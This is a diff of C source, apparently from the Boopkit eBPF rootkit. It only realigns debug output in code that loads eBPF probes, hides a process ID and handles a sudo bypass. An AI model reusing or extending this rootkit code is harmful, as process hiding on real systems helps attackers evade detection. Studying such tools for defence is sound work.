@@ -179,7 +179,6 @@ static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
 
 void rootcheck(int argc, char **argv) {
   long luid = (long)getuid();
-  boopprintf("  -> getuid()  : %ld\n", luid);
   if (luid != 0) {
     boopprintf("  XX Invalid UID.\n");
     if (!cfg.sudobypass) {
@@ -190,8 +189,6 @@ void rootcheck(int argc, char **argv) {
   }
   long lpid = (long)getpid();
   long lppid = (long)getppid();
-  boopprintf("  -> getpid()  : %ld\n", lpid);
-  boopprintf("  -> getppid() : %ld\n", lppid);
   if (lpid - lppid == 1) {
     // We assume we are running with sudo at this point!
     // If the ppid() and pid() are close together this
@@ -206,6 +203,9 @@ void rootcheck(int argc, char **argv) {
     }
     boopprintf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
   }
+  boopprintf("  -> getuid()                : %ld\n", luid);
+  boopprintf("  -> getpid()                : %ld\n", lpid);
+  boopprintf("  -> getppid()               : %ld\n", lppid);
 }
 
 /**
@@ -217,7 +217,7 @@ int main(int argc, char **argv) {
   clisetup(argc, argv);
   asciiheader();
   rootcheck(argc, argv);
-  boopprintf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");
+  boopprintf("  -> Logs                    : cat /sys/kernel/tracing/trace_pipe\n");
 
   int loaded, err;
   struct bpf_object *bpobj;
@@ -330,7 +330,7 @@ int main(int argc, char **argv) {
   // ===========================================================================
   // [pr0be.safe.o]
   {
-    boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
+    boopprintf("  -> Loading eBPF Probe      : %s\n", cfg.pr0besafepath);
     sfobj = pr0be_safe__open();
     // getpid()
     //
@@ -385,7 +385,7 @@ int main(int argc, char **argv) {
   // ===========================================================================
   // [pr0be.boop.o]
   {
-    boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0bebooppath);
+    boopprintf("  -> Loading eBPF Probe      : %s\n", cfg.pr0bebooppath);
     bpobj = bpf_object__open(cfg.pr0bebooppath);
     if (!bpobj) {
       boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
@@ -421,14 +421,14 @@ int main(int argc, char **argv) {
   // boop
   struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
   const char *bmapname = bpf_map__name(bpmap);
-  boopprintf("  ->   eBPF   Map Name: %s\n", bmapname);
+  boopprintf("  ->   eBPF   Map Name       : %s\n", bmapname);
   int fd = bpf_map__fd(bpmap);
 
   // logs
   for (int i = 0; i < cfg.denyc; i++) {
-    boopprintf("  XX Deny address: %s\n", cfg.deny[i]);
+    boopprintf("  XX Deny address            : %s\n", cfg.deny[i]);
   }
-  boopprintf("  -> Obfuscating PID: %s\n", pid);
+  boopprintf("  -> Obfuscating PID         : %s\n", pid);
 
   // ===========================================================================
   // Boopkit event loop
